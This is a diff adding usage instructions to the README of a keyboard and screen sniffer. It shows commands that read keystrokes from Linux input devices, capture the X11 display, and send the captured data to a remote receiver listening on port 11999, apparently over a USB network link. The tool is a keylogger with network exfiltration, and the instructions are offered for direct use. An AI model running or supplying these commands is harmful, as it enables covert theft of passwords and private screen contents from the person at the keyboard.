@@ -42,8 +42,23 @@ iface usb0 inet static<br>
 screen sniffig:<br>
 <img src="2.jpg"/><br>
 <br>
+<b>for disable X11 capture screen edit Makefile and change value variable NO_X11=0</b><br>
+<b>Example use receive and sniffer:</b><br>
 
+<h5>server receive event keyboard from sniffer</h5>
+<pre><code>./bin/receive 11999</code></pre><br>
+
+<h5>with network receive, sniffig keyboard by input event and capture display X11</h5>
+<pre><code>sudo ./bin/sniffer /dev/input/event0 192.168.7.2 11999 :0.0</code></pre><br>
+<h5>without network receive sniffig keyboard by input event and capture display X11</h5>
+<pre><code>sudo ./bin/sniffer /dev/input/event0 0 0 :0.0</code></pre><br>
+
+<h5>without x11 capture (only compile with NO_X11=0)</h5>
+<pre><code>sudo ./bin/sniffer /dev/input/by-path/pci-0000\:00\:14.0-usb-0\:7\:1.0-event-kbd 127.0.0.1 11999</code></pre><br>
+<br>
 if client side <code>ifconfig does</code> not return USB device, try with:<b><br>
 <b>ip address show</b><br>
 <b>ip link set usb0 up</b><br>
 <b>ifconfig usb0 192.168.7.10</b><br>
+
+
